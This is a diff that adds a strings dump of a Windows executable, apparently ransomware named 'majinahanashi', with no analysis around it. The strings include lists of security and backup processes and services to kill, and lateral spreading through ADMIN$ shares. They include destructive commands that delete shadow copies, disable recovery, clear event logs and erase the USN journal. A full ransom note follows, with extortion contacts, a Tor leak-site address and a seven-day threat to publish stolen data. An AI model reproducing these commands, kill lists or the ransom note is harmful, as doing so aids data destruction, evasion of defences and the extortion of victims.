@@ -1,0 +1,660 @@
+!This program cannot be run in DOS mode.
+RichuX
+`.rdata
+@.data
+.pdata
+@.reloc
+@USVWATAUAVAWH
+d$LtAH
+gfffMc
+A_A^A]A\_^[]
+<-uH8C
+|$ AVH
+VATAUAVAWH
+ A_A^A]A\^
+gfffffff
+D9c@u4
+UVWATAUAVAWH
+A_A^A]A\_^]
+gffffffff
+USVWATAUAVH
+D$@u=D
+gfffIc
+A^A]A\_^[]
+USWATAUAVAWH
+D0t$GL
+Hc|$0A
+A_A^A]A\_[]
+UVWATAUAVAWH
+pA_A^A]A\_^]
+@UVAVH
+@UWATAVH
+|$|.u#
+A^A\_]
+SVATAWH
+gfffLc
+HA_A\^[
+\$ taff
+UVWATAUAVAWH
+PA_A^A]A\_^]
+tv<#trH
+gfffIc
+UVWATAUAVAWH
+A_A^A]A\_^]
+tgD95S
+\$pt#H
+D$4ARN]E
+D$8 NULf
+UVATAVAWH
+|$XH1L$8A
+A_A^A\^]
+fD9 u[H
+WAVAWH
+@USVWAVH
+A^_^[]
+@USVWATAUAVAWH
+E7,8A:
+A_A^A]A\_^[]
+Windows
+System32
+WinSxS
+Recovery
+System Volume Information
+$Recycle.Bin
+$RECYCLE.BIN
+ProgramData
+perflogs
+Microsoft
+Windows Defender
+Config.Msi
+MSOCache
+$Windows.~BT
+$Windows.~WS
+$WinREAgent
+Windows.old
+WindowsApps
+Documents and Settings
+Windows Kits
+EBWebView
+\\.\X:
+[*] push_split (at depth limit): 
+[*] push_split d=
+[*]   join_path_heap FAIL
+[*]   build_extended_path FAIL
+[*]   FindFirstFileW FAIL err=
+ push root only
+[*] task: 
+SVC: task 
+[*]   push root: 
+ shallow=
+ pushed_subdirs=
+SVC: push_root shallow 
+ (shallow)
+C:\1\service.log
+SVC: log open
+SVC: cmdline=
+(null)
+majinSvc
+SVC: RegisterServiceCtrlHandler FAIL
+SVC: handler registered
+SVC: RUNNING, entering MajinRun
+SVC: MajinRun returned
+SVC: STOPPED
+verbose
+CONOUT$
+SVC: MajinRun enter
+ntdll.dll
+SVC: syscalls_init rc=
+Global\majinahanashi_Mutex
+SVC: mutex collision, exit
+SVC: mutex ok
+SVC: CIS machine, exit
+--nolan
+--decrypt
+--dry-run
+--discover
+--nopf
+--spread
+--edr-dev
+--qos-dev
+--test-pre
+--fast
+--full
+--safe
+--verbose
+--path
+[!] QoS module init failed (run as admin?)
+[!] Run test preflight mode..
+[*] Press any key to cleanup and exit...
+majinahanashi
+decrypt
+dry-run
+discover
+encrypt
+mode: 
+ nolan
+ path=
+REMOTE
+REMOVABLE
+[*] discover done
+NtSetInformationProcess
+[*] I/O priority: VeryLow
+[!] I/O priority: FAILED
+[*] Press any key to exit...
+[*] syscalls: SSNs Read=
+ Write=
+ Close=
+ | gadgets: 
+[!] syscalls: SSNs not resolved (err=
+[*] AES-NI: no (software fallback)
+[*] AES-NI: yes
+[*] RSA public key: loaded
+[!] RSA public key: not patched
+[*] RSA private key: loaded (use --decrypt to decrypt)
+[*] pre-flight...
+[*] pre-flight done
+[*] threads: 
+  threads: 
+SVC: discovering drives
+[*] GetLogicalDriveStringsA ret=
+[*] drive: 
+ type=
+[*]   pool_push (REMOTE) 
+[*]   push_split (SSD) 
+[*]   pool_push (HDD) 
+[*]   skipped (not FIXED/REMOTE)
+[*] GetLogicalDriveStringsA FAILED or buffer overflow
+[*] --path SSD: push_split
+[*] --path HDD/REMOTE: pool_push
+SVC: IoPriorityVeryLow set
+[!] I/O priority: NtSetInformationProcess failed
+SVC: IoPriorityVeryLow FAILED
+[!] I/O priority: GetProcAddress not found
+[*] I/O priority: Normal (SSD target or --ignore)
+SVC: IoPriorityNormal, VeryLow skipped
+--service --nolan
+ --dry-run
+ --fast
+ --full
+ --nopf
+ --verbose
+[*] working...
+[*] local done
+SVC: local pool done
+[*] post-flight...
+[*] post-flight done
+[*] done
+SVC: Majinprot done, returning
+.majin
+MB)...
+write(
+ FAIL(
+    region total 
+  opened, size=
+ SPARSE
+ COMPRESSED
+  file 
+  [full] off=0 len=
+  [stripe 
+] off=
+MB len=
+README.txt
+  [dry] 
+  [+] 
+[!] err=
+  [shallow skip] 
+ENCRYPTEDAES256!SCT2
+STRESS: unc_task 
+STRESS: share 
+STRESS: ADMIN$ on 
+ deploy
+ADMIN$\Temp\majin.exe
+STRESS: CopyFileW FAILED
+C:\Windows\Temp\majin.exe 
+STRESS: worker hi=
+STRESS: worker done
+STRESS: scan start
+STRESS: WSAStartup FAIL
+STRESS: no subnets
+STRESS: subnets=
+STRESS: subnet 
+STRESS: scan done
+STRESS: start
+STRESS: unc_workers=
+kernel32.dll
+CloseHandle
+CreateFileA
+CreateFileW
+CreateDirectoryA
+CreateEventA
+CreateIoCompletionPort
+CreateSemaphoreA
+CreateThread
+DeleteCriticalSection
+DeviceIoControl
+EnterCriticalSection
+ExitProcess
+FindClose
+FindFirstFileW
+FindNextFileW
+FlushFileBuffers
+GetCommandLineA
+GetCurrentProcessId
+GetDriveTypeA
+GetDiskFreeSpaceA
+GetEnvironmentVariableA
+GetFileInformationByHandle
+GetFileSizeEx
+GetFileAttributesW
+GetFullPathNameW
+GetSystemInfo
+GetLastError
+GetLogicalDriveStringsA
+GetModuleFileNameA
+GetModuleFileNameW
+GetModuleHandleA
+GetOverlappedResult
+GetProcessHeap
+GetQueuedCompletionStatus
+GetStdHandle
+GetTickCount
+GetVolumePathNameW
+HeapAlloc
+HeapFree
+HeapReAlloc
+InitOnceExecuteOnce
+InitializeCriticalSection
+LeaveCriticalSection
+LockFileEx
+lstrcmpA
+lstrcmpiA
+lstrcpyA
+lstrcpyW
+lstrcpynA
+lstrlenA
+lstrlenW
+MultiByteToWideChar
+MoveFileExW
+QueryPerformanceCounter
+QueryPerformanceFrequency
+ReadFile
+ReleaseSemaphore
+ResetEvent
+SetEndOfFile
+SetEvent
+SetLastError
+SetFilePointerEx
+TlsAlloc
+TlsFree
+TlsGetValue
+TlsSetValue
+UnlockFileEx
+VirtualAlloc
+VirtualFree
+WaitForSingleObject
+WideCharToMultiByte
+WriteFile
+CopyFileA
+CopyFileW
+OutputDebugStringA
+advapi32.dll
+CryptAcquireContextA
+CryptDecrypt
+CryptDestroyKey
+CryptEncrypt
+CryptGenRandom
+CryptImportKey
+CryptReleaseContext
+CryptSetKeyParam
+crypt32.dll
+CryptStringToBinaryA
+CloseServiceHandle
+CreateServiceA
+OpenSCManagerA
+OpenServiceA
+StartServiceA
+ChangeServiceConfigA
+ControlService
+DeleteService
+RegisterServiceCtrlHandlerA
+SetServiceStatus
+StartServiceCtrlDispatcherA
+OpenProcessToken
+AdjustTokenPrivileges
+AllocateAndInitializeSid
+CheckTokenMembership
+FreeSid
+GetTokenInformation
+LookupPrivilegeValueA
+RegCloseKey
+RegCreateKeyExA
+RegDeleteKeyA
+RegEnumKeyExA
+RegOpenKeyExA
+RegSetValueExA
+bcrypt.dll
+BCryptOpenAlgorithmProvider
+BCryptCreateHash
+BCryptHashData
+BCryptFinishHash
+BCryptDestroyHash
+ws2_32.dll
+WSAStartup
+WSACleanup
+WSAGetLastError
+socket
+closesocket
+connect
+ioctlsocket
+select
+getsockopt
+setsockopt
+inet_ntoa
+WSAIoctl
+gethostbyname
+gethostname
+iphlpapi.dll
+GetIpNetTable
+netapi32.dll
+NetShareEnum
+NetApiBufferFree
+rstrtmgr.dll
+RmStartSession
+RmRegisterResources
+RmGetList
+RmShutdown
+RmEndSession
+mpr.dll
+WNetGetConnectionA
+setupapi.dll
+SetupDiGetClassDevsA
+SetupDiEnumDeviceInterfaces
+SetupDiGetDeviceInterfaceDetailA
+SetupDiDestroyDeviceInfoList
+shell32.dll
+ShellExecuteExA
+gdi32.dll
+CreateCompatibleBitmap
+CreateCompatibleDC
+CreateFontIndirectA
+CreateSolidBrush
+DeleteDC
+DeleteObject
+GetDeviceCaps
+GetDIBits
+SelectObject
+SetBkMode
+SetTextColor
+GetTextExtentPoint32A
+user32.dll
+EnumDisplayDevicesA
+DrawTextA
+ReleaseDC
+FillRect
+SystemParametersInfoA
+wsprintfA
+fwpuclnt.dll
+FwpmEngineOpen0
+FwpmEngineClose0
+FwpmFilterAdd0
+FwpmProviderAdd0
+FwpmFreeMemory0
+FwpmProviderCreateEnumHandle0
+FwpmProviderEnum0
+FwpmProviderDestroyEnumHandle0
+FwpmFilterDeleteById0
+FwpmFilterCreateEnumHandle0
+FwpmFilterEnum0
+FwpmFilterDestroyEnumHandle0
+FwpmProviderDeleteByKey0
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+OpenProcess
+QueryFullProcessImageNameW
+QueryDosDeviceW
+GetProcAddress
+LoadLibraryA
+NtReadFile
+NtWriteFile
+NtClose
+NtQuerySystemInformation
+NtOpenProcess
+NtQueryInformationProcess
+edr_silence
+MsMpEng.exe
+NisSrv.exe
+SenseCncProxy.exe
+SenseIR.exe
+MsSense.exe
+avp.exe
+avpui.exe
+klnagent.exe
+klps.exe
+CSFalconService.exe
+CSAgent.exe
+SentinelAgent.exe
+SentinelServiceHost.exe
+SentinelStaticEngine.exe
+SentinelHelperService.exe
+cb.exe
+carbonblack.exe
+CbDefense.exe
+RepMgr.exe
+RepUtils.exe
+cyserver.exe
+cyverak.exe
+trapsd.exe
+ekrn.exe
+egui.exe
+eamonm.exe
+SavService.exe
+SophosUI.exe
+SophosHealth.exe
+SophosFileScanner.exe
+SSPService.exe
+masvc.exe
+mfemms.exe
+McAfee.TrueKey.Service.exe
+ccSvcHst.exe
+SymCorpUI.exe
+rtvscan.exe
+coreServiceShell.exe
+tmlisten.exe
+ntrtscan.exe
+bdagent.exe
+vsserv.exe
+bdservicehost.exe
+CylanceSvc.exe
+CylanceUI.exe
+fortiedr.exe
+FortiEDRCollector.exe
+qualys-cloud-agent.exe
+QualysAgent.exe
+TaniumClient.exe
+TaniumEndpointIndex.exe
+ir_agent.exe
+insight_agent.exe
+dwservice.exe
+drwcsd.exe
+spideragent.exe
+spiderui.exe
+qos_silence
+[qos] CoInitializeEx FAIL
+[qos] CoInitializeSecurity FAIL
+[qos] CoCreateInstance FAIL
+[qos] ConnectServer FAIL
+[qos] CoSetProxyBlanket FAIL
+[qos] blocked: 
+[qos] PutInstance FAIL: 
+[qos] init ok
+SDRSVC
+wbengine
+msftesql
+MSSQLSERVER
+MSSQLFDLauncher
+SQLSERVERAGENT
+SQLBrowser
+ReportServer
+WinDefend
+MsMpSvc
+WdNisSvc
+VeeamBackupSvc
+VeeamBrokerSvc
+VeeamCatalogSvc
+VeeamCloudSvc
+VeeamMountSvc
+VeeamNFSSvc
+VeeamTransportSvc
+AcronisAgent
+AcronisManagedMachine
+BackupExecAgent
+BackupExecRPC
+BackupExecDeviceMedia
+NetBackup
+BACLIENT
+TeamViewer
+vncserver
+RpcLocator
+preflight
+[pf] kill skipped (not admin)
+[pf] CreateToolhelp32Snapshot failed
+[pf] processes killed: 
+[pf] services skipped (not admin)
+[pf] OpenSCManager failed
+[pf] services stopped: 
+[pf] system tweaks skipped (not admin)
+SYSTEM\CurrentControlSet\Services\lanmanserver\parameters
+MaxMpxCt
+[pf] LanmanServer registry set
+SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
+DisablePagingExecutive
+LargeSystemCache
+[pf] Memory Management registry set
+delete shadows /all /quiet
+vssadmin.exe
+[pf] vssadmin executed
+/disable
+reagentc.exe
+/set {default} recoveryenabled no
+bcdedit.exe
+/set {default} bootstatuspolicy ignoreallfailures
+/hibernate off
+powercfg.exe
+cl System
+wevtutil.exe
+cl Security
+cl Application
+[pf] event logs cleared
+usn deletejournal /d %c:
+fsutil.exe
+/namespace:\\root\default path SystemRestore call Disable "%c:\"
+wmic.exe
+[pf] per-drive cleanup done
+C:\ProgramData
+C:\ProgramData\majin.bmp
+majin.bmp
+C:\majin.bmp
+[pf] generating wallpaper BMP (1920x1080)
+Segoe UI
+SEIZED
+M A J I N A H A N A S H I
+M A J I N A H
+THIS DEVICE HAS BEEN LOCKED.
+DO NOT MODIFY ENCRYPTED FILES.
+README.TXT
+[pf] BMP saved
+\Control Panel\Desktop
+Wallpaper
+WallpaperStyle
+\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+Control Panel\Desktop
+[pf] wallpaper applied
+[pf] init: admin
+[pf] init: user
+[pf] preflight start
+[pf] preflight done
+[pf] postflight start
+[pf] postflight done
+[pf] done: cleanup
+BgIAAACkAABSU0ExAAgAAAEAAQDXL1qJEU9KvQrBur301qES6VQ2gvW/TGldAYXsxCUPXA2zfcf3jy2AAt0JORMI2T1DFzUW7NGFeZKWPVqvalDcaRJNCmcbam5jxH+nGeOGVvba3C8jZZL32Zy10Do0V2GcpLsgvT9sPnOTQ0RlsOveZIUdrYWpE9LpYnmWuV2pblDEfxB0knss0jpiZfDvZQrIaN9g5STzu76F4/6mNMmZwtwAuaPibAYEmrIUTuYd+lyXQuniTEWuWlEgG/e/R7EjAAYFEAuavly0xs6XAXpHSgU3P+nu1GSQtWyzTHq07Bt9nt0AZXimbsIINWRY3DJ7yq/z59EsdfktEkoYbE2k
+MAJINAHANASHI
+We entered. We looked around. We took what was there.
+This is the report.
+--------------------------------------------------------------------------
+WHAT WE DID
+Files were encrypted where they sat. A unique key per
+file, wrapped under an offline key that leaves with us
+when this is over. Backups and shadow copies were
+removed because they get in the way.
+No files were deleted. No data was corrupted. Every
+byte can be recovered.
+--------------------------------------------------------------------------
+WHAT WE TOOK
+A copy of your internal data was extracted during the
+process. This is not a threat - it is a statement of
+fact. We have it. You do not.
+If an agreement is reached, all copies are destroyed
+and you receive written confirmation. If no agreement
+is reached, the data finds new owners.
+--------------------------------------------------------------------------
+NEXT MOVE
+Contact us via qTOX: 59DE03AE55C400954D0973FFB90C251A7FDCEB3079A42DF6A6DB93E7D1915F5C47B238A2A99E
+Contact us via EMAIL: thedoctorcame@protonmail.com
+Case:    873F5435
+Download qTOX: https://qtox.github.io/
+Send 2 files. We decrypt them. This is not a
+negotiation tactic - it is verification that we
+hold the keys and that recovery is possible.
+Once you have proof, we talk.
+No intermediaries. No recovery consultants. No law
+enforcement liaison. Every person you add to this
+conversation is another person who knows what
+happened here.
+--------------------------------------------------------------------------
+TIMELINE
+Day 7 - the full dataset is released. Regulators,
+clients, and affected parties are notified directly.
+Disclosure site (Tor): http://lthicpjqc7gkn5eq3epxndc2uig3yngvcbdya4u3m3byjod5km4yuwqd.onion/
+--------------------------------------------------------------------------
+This message is your copy. We do not send reminders.
+.text$mn
+.idata$5
+.rdata
+.rdata$voltmd
+.rdata$zzzdbg
+.xdata
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.pdata
+SetStdHandle
+WaitForMultipleObjects
+GetCurrentProcess
+SetPriorityClass
+GetProcAddress
+lstrcmpiW
+GetGeoInfoW
+GetUserGeoID
+AllocConsole
+lstrcatW
+GetFileAttributesExA
+GetTempPathA
+TerminateProcess
+CreateProcessA
+lstrcatA
+KERNEL32.dll
+StretchBlt
+GDI32.dll
+GetKeyboardLayoutList
+wsprintfW
+USER32.dll
+CoUninitialize
+CoInitializeEx
+CoInitializeSecurity
+CoSetProxyBlanket
+CoCreateInstance
+CoCreateGuid
+ole32.dll
+OLEAUT32.dll
